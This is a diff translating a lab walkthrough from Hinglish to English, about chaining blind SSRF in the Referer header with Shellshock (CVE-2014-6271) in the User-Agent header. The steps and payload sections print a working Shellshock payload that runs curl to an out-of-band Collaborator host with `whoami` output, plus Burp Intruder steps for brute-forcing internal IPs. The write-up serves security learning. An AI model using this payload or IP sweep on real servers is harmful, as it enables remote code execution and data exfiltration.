@@ -6,26 +6,26 @@
 
 ---
 
-### Where I Found Vulnerability ?
+### Where I Found Vulnerability?
 - **URL:** `/product?productId=1`
 - **Parameters:** `User-Agent` header + `Referer` header
 - **Two vulnerabilities chained:**
-  - 🔗 Blind SSRF → `Referer` header se internal server hit kiya
-  - 💥 Shellshock (CVE-2014-6271) → `User-Agent` header se RCE
+  - 🔗 Blind SSRF → hit the internal server via the `Referer` header
+  - 💥 Shellshock (CVE-2014-6271) → RCE via the `User-Agent` header
 
 ---
 
-### What is Shellshock ? 🐚
-> Shellshock ek **Bash vulnerability (2014)** hai jisme specially crafted environment variable se **arbitrary commands execute** ho jaate hain.
+### What is Shellshock? 🐚
+> Shellshock is a **Bash vulnerability (2014)** in which a specially crafted environment variable causes **arbitrary commands to execute**.
 
 ```bash
 # Normal Bash function:
 greet() { echo "Hello"; }
 
-# Shellshock Payload — function ke baad command inject:
+# Shellshock Payload — command injected after the function:
 () { :; }; echo "HACKED"
 #    ↑              ↑
-# Fake function    Ye execute ho jaata hai!
+# Fake function    This gets executed!
 ```
 - **CVE:** CVE-2014-6271
 - **CVSS Score:** 10.0 (Maximum) 🚨
@@ -33,22 +33,22 @@ greet() { echo "Hello"; }
 
 ---
 
-### Steps ?
-1. Kisi bhi product pe jao aur Burp mein intercept karo
-2. Request ko **Intruder** mein bhejo
-3. `Referer` header mein `http://192.168.0.§X§:8080/` set karo — `X` ko payload position banao
-4. `User-Agent` header mein **Shellshock payload** daalo with Collaborator URL:
+### Steps?
+1. Go to any product and intercept in Burp
+2. Send the request to **Intruder**
+3. Set `http://192.168.0.§X§:8080/` in the `Referer` header — make `X` the payload position
+4. Put a **Shellshock payload** in the `User-Agent` header with the Collaborator URL:
 ```
 () { :; }; curl http://YOUR-COLLABORATOR-ID.oastify.com/`whoami`
 ```
-5. Intruder run karo → Numbers `1-255` bruteforce karo Referer IP ke liye
-6. Burp Collaborator → **Poll Now** click karo
-7. Incoming HTTP request mein URL path dekho → `/peter-XXXXXX` — ye OS username hai
-8. Lab mein username submit karo → ✅ Solved
+5. Run Intruder → bruteforce numbers `1-255` for the Referer IP
+6. Go to Burp Collaborator → click **Poll Now**
+7. Look at the URL path in the incoming HTTP request → `/peter-XXXXXX` — this is the OS username
+8. Submit the username in the lab → ✅ Solved
 
 ---
 
-### Working Payloads ?
+### Working Payloads?
 
 **User-Agent (Shellshock + OOB):**
 ```bash
@@ -63,27 +63,27 @@ http://192.168.0.X:8080/
 **Payload Breakdown:**
 ```
 () { :; };         ← Shellshock trigger (malformed bash function)
-curl               ← Command jo execute hogi server pe
-http://COLLAB/     ← Tumhara Collaborator URL
-`whoami`           ← Command substitution — output URL mein append hoga
+curl               ← Command that executes on the server
+http://COLLAB/     ← Your Collaborator URL
+`whoami`           ← Command substitution — output gets appended to the URL
                       Server → GET /peter-p0L6PW → Collaborator
 ```
 
 ---
 
-### Why it Worked ? 🧠
+### Why it Worked? 🧠
 
 **Step 1 — Blind SSRF via Referer:**
-- Server `Referer` header ki URL ko background mein fetch kar raha tha
-- `192.168.0.X:8080` pe ek internal server tha jo Bash CGI use karta tha
-- Referer bruteforce se sahi IP (167 ya koi bhi) mili jahan server tha
+- The server was fetching the `Referer` header's URL in the background
+- There was an internal server at `192.168.0.X:8080` that used Bash CGI
+- Bruteforcing the Referer found the right IP (167 or whichever) where the server was
 
 **Step 2 — Shellshock via User-Agent:**
-- Internal server CGI script HTTP headers ko **Bash environment variables** mein pass karta tha
-- `User-Agent` header → `HTTP_USER_AGENT` environment variable bana
-- Shellshock ne is variable ko parse kiya aur `curl whoami` execute ho gayi
-- `whoami` ka output (`peter-XXXXXX`) Collaborator URL mein append hua
-- Collaborator pe incoming request mein username dikh gaya 👀
+- The internal server's CGI script passed HTTP headers as **Bash environment variables**
+- The `User-Agent` header became the `HTTP_USER_AGENT` environment variable
+- Shellshock parsed this variable and executed `curl whoami`
+- The output of `whoami` (`peter-XXXXXX`) got appended to the Collaborator URL
+- The username showed up in the incoming request on Collaborator 👀
 
 ```
 Attack Chain:
@@ -102,13 +102,13 @@ Collaborator receives: GET /peter-p0L6PW  ← Username leaked!
 
 ---
 
-### What I Learned ? 🎓
+### What I Learned? 🎓
 
-- 🔗 **Vulnerability Chaining** — Ek vulnerability akeli weak ho sakti hai, lekin chain karo toh devastating: `Blind SSRF → Shellshock → RCE`
-- 🐚 **Shellshock** sirf old servers pe kaam karta hai lekin real bug bounty mein aaj bhi milta hai legacy systems mein
-- 📡 **Out-of-Band (OOB) Data Exfiltration** — Response nahi dikha, lekin `whoami` output Collaborator URL ke through leak hua — ye Blind scenarios mein gold hai
-- 🎯 **HTTP Headers = Attack Surface** — Sirf URL parameters nahi, `User-Agent`, `Referer`, `X-Forwarded-For` sab test karo
-- 🔢 **Intruder IP Bruteforce** — Jab internal IP pata na ho, `1-255` range fuzz karo — 200 OK wali IP real server hai
+- 🔗 **Vulnerability Chaining** — one vulnerability alone can be weak, but chain them together and it's devastating: `Blind SSRF → Shellshock → RCE`
+- 🐚 **Shellshock** only works on old servers, but is still found today in real bug bounty on legacy systems
+- 📡 **Out-of-Band (OOB) Data Exfiltration** — the response wasn't visible, but the `whoami` output leaked through the Collaborator URL — this is gold in Blind scenarios
+- 🎯 **HTTP Headers = Attack Surface** — don't just test URL parameters, also test `User-Agent`, `Referer`, `X-Forwarded-For`
+- 🔢 **Intruder IP Bruteforce** — when the internal IP isn't known, fuzz the `1-255` range — the IP that returns 200 OK is the real server
 
 ---
 
@@ -128,3 +128,4 @@ Collaborator receives: GET /peter-p0L6PW  ← Username leaked!
 ```
 
 ---
+
